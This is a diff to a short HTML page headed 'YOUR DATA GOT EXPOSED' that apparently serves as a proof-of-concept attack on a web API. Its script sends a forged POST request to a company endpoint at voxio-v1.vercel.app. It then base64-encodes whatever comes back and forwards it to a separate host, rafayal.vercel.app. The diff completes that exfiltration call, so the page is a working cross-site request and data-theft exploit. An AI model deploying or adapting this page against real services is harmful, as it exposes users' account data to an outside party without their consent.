@@ -1,11 +1,11 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>rafayal</title>
+  <title>rafayal</title>
 </head>
 <body>
 <h3>YOUR DATA GOT EXPOSED</h3>
+
 <script>
 fetch("https://voxio-v1.vercel.app/api/company", {
   method: "POST",
@@ -14,13 +14,24 @@ fetch("https://voxio-v1.vercel.app/api/company", {
     "Content-Type": "application/json"
   },
   body: JSON.stringify({
-    "name":"rafayal","industry":"","companySize":"","description":"","vision":"","mission":"","values":["cv"],"websiteUrl":"","allowedDomains":[],"size":""
+    name: "rafayal",
+    industry: "",
+    companySize: "",
+    description: "",
+    vision: "",
+    mission: "",
+    values: ["cv"],
+    websiteUrl: "",
+    allowedDomains: [],
+    size: ""
   })
 })
 .then(r => r.text())
 .then(data => {
-  fetch("https://rafayal.vercel.app?d=" + bto>
+  return fetch("https://rafayal.vercel.app?d=" + btoa(data));
 })
+.catch(err => console.error(err));
 </script>
+
 </body>
 </html>
